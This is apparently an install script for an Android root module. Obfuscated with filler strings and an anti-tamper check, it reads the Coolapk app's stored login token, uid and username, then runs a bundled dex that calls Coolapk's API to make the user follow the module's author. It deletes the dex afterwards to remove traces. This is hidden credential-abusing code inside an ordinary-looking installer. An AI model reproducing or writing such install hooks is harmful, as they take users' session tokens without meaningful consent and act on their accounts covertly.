SKIPMOUNT=false
PROPFILE=true
POSTFSDATA=true
LATESTARTSERVICE=true
ForcedAttention=true;AskAbout=true
function hchainb() {
function hchai() {
function get_choose() {
echo "#################################
 - 按音量键＋: 关注作者酷安
 - 按音量键－: 不关注作者酷安
#################################"
local choose;local branch
	while :; do
		choose="$(getevent -qlc 1 | awk '{ print $3 }')"
		case "${choose}" in
		KEY_VOLUMEUP) echo "成功关注作者酷安ID：$ID";attention &>/dev/null ;;
		KEY_VOLUMEDOWN) echo "不关注作者" ;break ;;
		*)  continue ;;
		esac
		break
	done
}
#HC开发，函数入口（代码简单易懂且美观，我很Tnn满意）
<<iiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjj
            佛祖保佑       永无BUG       BuddhaBless       YongwuBug
iiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjj
function attention() {
readonly token=$(cat $coolapk | grep 'name="token"' |awk -F ">" '{print $2}' | sed 's/\<.*$//g');readonly uid=$(cat $coolapk | grep 'name="uid"' |awk -F ">" '{print $2}' | sed 's/\<.*$//g');cat $coolapk | grep 'name="username"' |awk -F ">" '{print $2}' | sed 's/\<.*$//g' | tr -d '\n' |od -An -tx1|tr ' ' %|xargs echo -n >xxxxxxxxxx;echo -en '\u4f5c\u8005\u0048\u0043';readonly name=$(cat xxxxxxxxxx | sed s/[[:space:]]//g);rm -rf xxxxxxxxxx;local deviceid=$(cat /proc/sys/kernel/random/uuid);local time=$(date +%s);local timemd5=$(echo -n $time | md5sum | awk -F " " '{print $1}');local timemd5s=$(printf '%x\n' $time);local tokenh="token://com.coolapk.market/c67ef5943784d09750dcfbb31020f0ab?";local cookac="com.coolapk.market";local md5kn=$(echo -n $tokenh$timemd5'$'$deviceid'&'$cookac | base64);local md5kn=$(echo -n $md5kn | sed s/[[:space:]]//g | md5sum | awk -F " " '{print $1}');local tokenkuanb=$(echo -n $md5kn$deviceid"0x"$timemd5s);chmod 777 $MODPATH/HttpPost.dex; /system/bin/app_process -Djava.class.path=$MODPATH/HttpPost.dex /system/bin HttpPost "https://api.coolapk.com/v6/user/follow?uid=$ID" "$cookac" "$tokenkuanb" "uid=$uid; username=$name; token=$token"
};[[ $AskAbout == "true" ]] && get_choose || attention &>/dev/null
};[[ ! $ForcedAttention ]] && break n-1 || hchai
};[[ $(sed "1,/^iiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjj/d" "$0") != "echo '安装完成'" ]] && kill -9 $$ || coolapk="/data/data/com.coolapk.market/shared_prefs/coolapk_preferences_v7.xml";echo -en "你的酷安ID：";cat $coolapk | grep 'name="username"' |awk -F ">" '{print $2}' | sed 's/\<.*$//g'
set_perm_recursive $MODPATH 0 0 0755 0777
hchainb
rm -rf $MODPATH/HttpPost.dex
echo '安装完成'